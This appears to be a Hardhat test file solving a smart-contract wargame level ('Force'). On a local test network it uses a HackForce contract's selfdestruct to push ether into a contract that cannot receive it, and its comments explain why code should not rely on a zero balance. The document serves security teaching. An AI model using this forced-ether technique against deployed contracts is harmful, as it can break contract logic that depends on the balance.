const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Force", function () {
  let deployer;
  let hacker;
  let tester;

  it("Should hack fallback function for claiming contract ownership", async function () {
    // 🔨 Addresses
    [deployer, hacker, tester] = await ethers.getSigners();

    // 📗 Contract to be hacked
    const Contract = await ethers.getContractFactory("Force", deployer);
    const contract = await Contract.connect(deployer).deploy();
    await contract.deployed();

    // 📕 Deploy the contract that will execute the hack
    const HackForce = await ethers.getContractFactory("HackForce", deployer);
    const hackForce = await HackForce.connect(deployer).deploy(
      contract.address
    );
    await hackForce.deployed();

    // 🗣 Logging status
    let forceBalance = await ethers.provider.getBalance(contract.address);
    console.log("💰 Initial Force.sol balance:", forceBalance);
    console.log(
      "💰 Hacker balance:",
      await ethers.provider.getBalance(hacker.address)
    );

    // 👿 Hacking the contract

    // 👉 Send ether from a SC using send() ❌
    const [
      sendTransaction,
      send,
      transfer,
      callValue,
      selfDestruct,
      beTheCracker,
    ] = [false, false, false, false, true];

    // 👉 Send ether as EOA ❌
    if (sendTransaction) {
      const txSendTransaction = await hacker.sendTransaction({
        to: contract.address,
        value: ethers.utils.parseEther("0.000001"),
      });
      await txSendTransaction.wait((confirms = 1));
    }

    // 👉 Send ether from a SC using send() ❌
    if (send) {
      const txSend = await hackForce.sendEther({
        value: ethers.utils.parseEther("0.000001"),
      });
      await txSend.wait((confirms = 1));
    }

    // 👉 Send ether from a SC using transfer() ❌
    if (transfer) {
      const txTransfer = await hackForce.transferEther({
        value: ethers.utils.parseEther("0.000001"),
      });
      await txTransfer.wait((confirms = 1));
    }

    // 👉 Send ether from a SC using call.value() ❌
    if (callValue) {
      const txCallValue = await hackForce.callValueEther({
        value: ethers.utils.parseEther("0.000001"),
      });
      await txCallValue.wait((confirms = 1));
    }

    // 👉 Send ether from a SC using selfdestruct ✅
    if (selfDestruct) {
      // 👁‍🗨✍ Important!
      // In solidity, for a contract to be able to receive ether,
      // the fallback function must be marked payable.
      //
      // However, there is no way to stop an attacker from sending
      // ether to a contract by self destroying.
      // Hence, it is important not to count on the invariant
      // address(this).balance == 0 for any contract logic.
      const txTransfer = await hackForce.selfDestructEther({
        value: ethers.utils.parseEther("0.000001"),
      });
      await txTransfer.wait((confirms = 1));
    }

    // 👉 Send ether before the contract is deployed ✅
    if (beTheCracker) {
      // 👁‍🗨✍ Important!
      // There is another option which is to know the address of the contract that
      // is going to be hacked. However, for this we should know the private key
      // of the deployer. Not an option here.
      //
      // This is the reason why the deployments should always be done by a completely new address.
      //
      // In case the contract is hacked and we have locked down the contract so there is no way to
      // send ether to it, the only person that could send ether to the contract is the deployer
      // or a contract that used the function selfdestruct to alter the balances in our SC 😉
    }

    // 🗣 Logging status
    forceBalance = await ethers.provider.getBalance(contract.address);
    console.log("💰 Force.sol balance:", forceBalance);

    // ✅ Check if the hack was successful
    expect(forceBalance.toNumber() > 0).to.be.true;
  });
});
